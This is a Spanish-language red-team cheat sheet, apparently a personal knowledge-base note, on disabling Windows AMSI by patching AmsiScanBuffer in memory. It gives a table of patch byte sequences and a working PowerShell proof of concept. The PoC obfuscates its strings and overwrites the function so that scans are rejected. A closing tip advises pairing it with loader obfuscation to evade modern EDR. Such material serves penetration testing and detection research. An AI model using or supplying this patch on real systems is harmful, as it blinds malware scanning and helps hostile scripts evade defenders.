---
aliases:
  - AmsiScanBuffer Patch
  - AMSI Memory Patch
tags:
  - technique/defense-evasion
  - env/windows
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AMSI Bypasses]]"
---
# AMSI Bypasses - Memory Patch

> Parchea los bytes de `AmsiScanBuffer` en memoria para que retorne un código que hace a AMSI rechazar el scan. Más robusto que reflection contra EDR moderno.

---

## Patch de AmsiScanBuffer

| **Técnica** | **Qué hace** | **Cuándo** |
|:---|:---|:---|
| Patch `AmsiScanBuffer` → `E_INVALIDARG` | AMSI rechaza el scan, PowerShell ejecuta igual | EDR con detección reflection. |
| Bytes `0xB8 0x57 0x00 0x07 0x80 0xC3` | `mov eax, 0x80070057; ret` (E_INVALIDARG) | Patch estándar (rastamouse). |
| Bytes `0xB8 0x00 0x00 0x00 0x00 0xC3` | Return `0` (AMSI_RESULT_CLEAN) | Variante. |
| Bytes `0xC3` | RET directo | A veces funciona, menos fiable. |
^amsi-patch

### PoC patch (rastamouse minimal)

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
}
"@
Add-Type $Win32
$lib = [Win32]::LoadLibrary("am"+"si.dll")
$addr = [Win32]::GetProcAddress($lib, "Amsi"+"ScanBuffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8,0x57,0x00,0x07,0x80,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
# AmsiScanBuffer ahora retorna E_INVALIDARG → AMSI no escanea
```

> [!tip] Memory patch > reflection
> Contra EDR moderno, el patch de memoria es más fiable que `amsiInitFailed` (que muchos EDR ya detectan por telemetría). Combinar con ofuscación del propio loader.
